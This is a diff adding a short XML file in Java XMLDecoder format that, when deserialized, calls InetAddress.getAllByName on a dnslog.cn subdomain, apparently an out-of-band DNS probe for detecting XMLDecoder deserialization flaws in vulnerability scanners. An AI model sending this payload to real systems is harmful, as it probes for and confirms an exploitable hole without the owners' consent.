@@ -1,0 +1,7 @@
+<java>
+<object class="java.net.InetAddress">
+    <method name="getAllByName">
+        <string>mmwewe.9x2i54.dnslog.cn</string>
+    </method>
+</object>
+</java>
